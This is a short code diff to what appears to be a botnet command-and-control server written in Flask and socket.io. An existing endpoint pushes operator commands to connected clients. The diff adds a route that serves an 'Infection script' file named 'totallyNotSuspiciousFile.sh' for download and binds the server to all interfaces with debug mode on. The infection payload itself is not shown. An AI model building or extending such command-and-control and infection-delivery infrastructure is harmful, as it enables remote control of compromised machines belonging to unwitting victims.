@@ -1,5 +1,4 @@
-from flask import Flask, request, Response
-import os, json
+from flask import Flask, request, send_file, render_template
 import socketio
 
 
@@ -23,5 +22,14 @@ def command_control():
             sio.emit("command", request.get_json(),room=s)
     return "Done"
 
+@app.route('/script', methods=["GET"])
+def myscript():
+    path= "Infection script/totallyNotSuspiciousFile.sh"
+    return send_file(path)
+
+@app.route('/home')
+def home():
+    return render_template("index.html")
+
 if __name__ == '__main__':
-    app.run(run="0.0.0.0",debug=true)
+    app.run(host="0.0.0.0",debug=true)
